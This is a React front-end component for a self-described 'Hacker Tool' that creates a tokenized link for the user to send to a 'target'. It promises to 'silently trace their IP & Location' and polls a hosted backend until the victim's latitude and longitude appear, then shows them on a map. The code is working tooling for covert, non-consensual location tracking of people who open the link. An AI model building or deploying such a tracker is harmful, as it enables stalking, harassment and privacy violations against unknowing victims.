import { useEffect, useState, useRef } from "react";
import axios from "axios";
import './index.css';

function Home() {
  const [token, setToken] = useState("");
  const [siteLink, setSiteLink] = useState("");
  const [location, setLocation] = useState(null);
  const [isSearching, setIsSearching] = useState(false); // <-- New state for waiting status
  const [copyButtonText, setCopyButtonText] = useState("Copy Link"); // <-- New state for copy button

  // Ref to hold the interval ID so we can clear it from anywhere
  const intervalRef = useRef(null);

  useEffect(() => {
    const newToken = crypto.randomUUID();
    setToken(newToken);
    const deployedSimplePage = "https://simple-page-amber.vercel.app/";
    setSiteLink(`${deployedSimplePage}?token=${newToken}`);
  }, []);

  // ⏳ Poll every 5 seconds for new location
  useEffect(() => {
    // Don't start polling until we have a token and the link has been shared
    if (!token || !isSearching) return;

    intervalRef.current = setInterval(() => {
      axios
        .get(`https://spotme-z1of.onrender.com/location/${token}`)
        .then((res) => {
          setLocation(res.data);
          setIsSearching(false); // <-- Stop searching on success
          console.log("✅ Location found! Stopping poll.");
        })
        .catch((error) => {
          // This catch will trigger for 404s, which is expected.
          // We don't need to do anything here, just let it poll again.
          console.log("⏳ Still searching...",error);
        });
    }, 5000);

    // Cleanup function
    return () => clearInterval(intervalRef.current);
  }, [token, isSearching]); // <-- Rerun effect when isSearching changes

  // Stop the interval if location is found
  useEffect(() => {
    if (location && intervalRef.current) {
      clearInterval(intervalRef.current);
    }
  }, [location]);

  const handleCopyLink = () => {
    navigator.clipboard.writeText(siteLink);
    setCopyButtonText("Copied!");
    setIsSearching(true); // Start searching once the link is copied
    setTimeout(() => setCopyButtonText("Copy Link"), 2000); // Reset button text
  };

  return (
    <div className="min-h-screen bg-black text-green-400 font-mono flex flex-col justify-center items-center px-6">
      <style>{`
        @keyframes ping-slow {
          75%, 100% {
            transform: scale(1.5);
            opacity: 0;
          }
        }
        .animate-ping-slow {
          animation: ping-slow 3s cubic-bezier(0, 0, 0.2, 1) infinite;
        }
        @keyframes spin-sweep {
          from {
            transform: rotate(0deg);
          }
          to {
            transform: rotate(360deg);
          }
        }
        .animate-spin-sweep {
          animation: spin-sweep 4s linear infinite;
        }
        @keyframes fade-in {
          from {
            opacity: 0;
            transform: translateY(10px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-fade-in {
          animation: fade-in 0.5s ease-out forwards;
        }
      `}</style>

      <h1 className="text-4xl md:text-6xl font-bold mb-8 text-center">
        🎯 Hacker Tool: Track Target’s Location
      </h1>

      <div className="relative w-72 h-72 mb-10">
        <div className="absolute inset-0 border-2 border-green-500 rounded-full animate-ping-slow"></div>
        <div className="absolute inset-0 border border-green-600 rounded-full"></div>
        <div className="absolute inset-0 flex items-center justify-center">
        <div className="w-[2px] h-[144px] bg-green-400 origin-bottom animate-spin-sweep translate-y-[-70px]"></div>
        </div>
        <div className="absolute top-[25%] left-[60%] w-2 h-2 bg-green-400 rounded-full shadow-[0_0_8px_3px_rgba(34,197,94,0.7)] animate-pulse"></div>
        <div className="absolute top-[60%] left-[35%] w-2 h-2 bg-green-400 rounded-full shadow-[0_0_8px_3px_rgba(34,197,94,0.7)] animate-pulse delay-500"></div>
        <div className="absolute top-[40%] left-[45%] w-2 h-2 bg-green-400 rounded-full shadow-[0_0_8px_3px_rgba(34,197,94,0.7)] animate-pulse delay-[800ms]"></div>
      </div>
      <p className="text-lg md:text-xl text-center mb-6 max-w-xl">
        Share the link below with anyone. Once they open it, we'll silently trace their <span className="text-green-300">IP & Location</span>.
      </p>
    
      <div className="bg-green-900/20 border border-green-500 rounded-xl p-4 shadow-lg w-full max-w-lg text-center">
        <p className="mb-2">👉 Send this link to your target:</p>
        <div className="flex gap-2">
          <input
            value={siteLink}
            readOnly
            className="w-full bg-transparent border border-green-400 rounded-md px-4 py-2 text-green-300 text-sm focus:outline-none"
          />
          <button
            onClick={handleCopyLink}
            className="bg-green-500 text-black px-4 py-2 rounded-md hover:bg-green-400 transition whitespace-nowrap"
          >
            {copyButtonText}
          </button>
        </div>
      </div>

      {/* --- Status and Result Display --- */}
      <div className="mt-8 text-center space-y-3 h-24">
        {isSearching && !location && (
          <p className="text-yellow-400 animate-pulse">
            Waiting for target to open the link...
          </p>
        )}

        {location && (
          <div className="space-y-3 animate-fade-in">
            <p className="text-green-300 text-lg">
              🎯 Target Acquired!
            </p>
            <p className="text-green-300 text-sm">
              <strong>Lat:</strong> {location.location.lat.toFixed(5)} |{" "}
              <strong>Lon:</strong> {location.location.lon.toFixed(5)}
            </p>

            <a
              href={`/map?lat=${location.location.lat}&lon=${location.location.lon}`}
              className="inline-block bg-green-400 text-black px-6 py-2 rounded-md hover:scale-105 transition"
            >
              🌍 View on Map
            </a>
          </div>
        )}
      </div>

      <p className="mt-6 text-green-600 text-xs">* Works best on mobile browsers</p>
    </div>
  );
}

export default Home;